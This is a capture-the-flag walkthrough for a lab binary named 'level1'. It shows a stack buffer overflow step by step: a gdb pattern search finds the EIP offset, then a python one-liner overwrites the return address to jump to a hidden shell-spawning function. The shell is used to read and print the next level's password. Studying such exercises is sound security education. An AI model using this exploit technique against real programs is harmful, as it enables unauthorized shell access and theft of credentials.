# level1

On this level we have one executable (`level1`).
```bash
> ./level1
<read user input>
```
If we send a big string to the program, we have a segfault
```bash
./level1
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

we can have the maximum lenght of the string in gdb
```bash
(gdb) gdb level1
(gdb) pattern create 100  ; works only with peda
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
(gdb) run
...
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
...
(gdb) pattern search  ; search for the pattern in the program
... ; we can see the EIP (pointer address at an offset of 76)
EIP+0 found at offset: 76
...
```

if we disass the code with radare2 (or any disassembler), we can see a run function. this function is never called and this function exec a shell.

We get his adress on the disassembler (`08048444`) and we will try to send it has EIP (Instruction Pointer).
```bash
> python -c 'print "A"*76 + "\x44\x84\x04\x08"' > /tmp/args  # create 76 char (offset of EIP) and then put the address
> cat /tmp/args - | ./level1
Good... Wait what?
> # you have a shell on level2
> cd ../level2
> cat .pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

